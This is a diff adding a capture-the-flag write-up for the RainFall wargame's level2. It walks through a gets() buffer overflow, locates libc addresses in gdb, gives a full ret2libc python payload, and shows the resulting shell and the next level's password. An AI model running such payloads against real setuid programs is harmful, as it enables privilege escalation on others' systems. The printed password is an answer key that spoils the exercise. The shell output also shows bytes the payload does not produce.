@@ -1,0 +1,128 @@
+Upon login, we're greeted with the checksec of the binary:
+
+```shell
+ System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
+```
+
+There is another SUID binary that is owned by level3. 
+
+```shell
+level2@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
+```
+
+When running it, it prints the input.
+
+```shell
+level2@RainFall:~$ ./level2
+42
+42
+```
+
+Let's copy it over with ``scp``
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ scp -P 4242 level2@192.168.64.3:/home/user/level2/level2 .
+          _____       _       ______    _ _ 
+         |  __ \     (_)     |  ____|  | | |
+         | |__) |__ _ _ _ __ | |__ __ _| | |
+         |  _  /  _` | | '_ \|  __/ _` | | |
+         | | \ \ (_| | | | | | | | (_| | | |
+         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|
+
+                 Good luck & Have fun
+
+  To start, ssh with level0/level0 on 192.168.64.3:4242
+level2@192.168.64.3's password: 
+level2                                                                                                   100% 5403     1.3MB/s   00:00  
+```
+
+and decompile it with ``ghidra``.
+
+```C
+void p(void)
+{
+  uint unaff_retaddr;
+  char local_50 [76];
+  
+  fflush(stdout);
+  gets(local_50);
+  if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
+    printf("(%p)\n",unaff_retaddr);
+                    /* WARNING: Subroutine does not return */
+    _exit(1);
+  }
+  puts(local_50);
+  strdup(local_50);
+  return;
+}
+
+void main(void)
+{
+  p();
+  return;
+}
+```
+
+We find the same ``gets`` vulnerability, where we can overflow the buffer. As the program doesn't provide a function that would run a new shell, we can use return2libc [[01]](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc) instead. For this exploit we need to find the address of ``system``, ``/bin/sh``, ``return`` and ``exit`` as well as the buffer length. We can do so with ``gdb``. 
+
+```shell
+level2@RainFall:~$ gdb level2
+(gdb) break main
+Breakpoint 1 at 0x8048542
+(gdb) run
+Starting program: /home/user/level2/level2
+
+Breakpoint 1, 0x08048542 in main ()
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+(gdb) find &system, +9999999, "/bin/sh"
+0xb7f8cc58
+warning: Unable to access target memory at 0xb7fd3160, halting search.
+1 pattern found.
+(gdb) print exit
+$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+```
+
+Now we need to convert these addresses into little endian:
+
+```shell
+/bin/sh 0xb7f8cc58 -> ``\x58\xcc\xf8\xb7``
+exit 0xb7e5ebe0 -> ``\xe0\xeb\xe5\xb7``
+system 0xb7e6b060 -> ``\x60\xb0\xe6\xb7``
+return 0x0804853e -> ``\x3e\x85\x04\x08``
+```
+
+With this we can create a payload. 
+
+```shell
+python -c "print 'A' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7'" > /tmp/payload
+```
+
+And run our payload as the stdin argument of ``level2`` through a pipe with cat. 
+
+```shell
+level2@RainFall:~$ cat /tmp/payload - | ./level2
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>AAAAAAAAAAAA>`��BBBBX�����
+whoami
+level3
+cd ../level3
+cat .pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+exit
+exit
+level2@RainFall:~$ su level3
+Password:
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
+```
+
+---
+
+## Sources
+
+[01] - [return2libc](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)
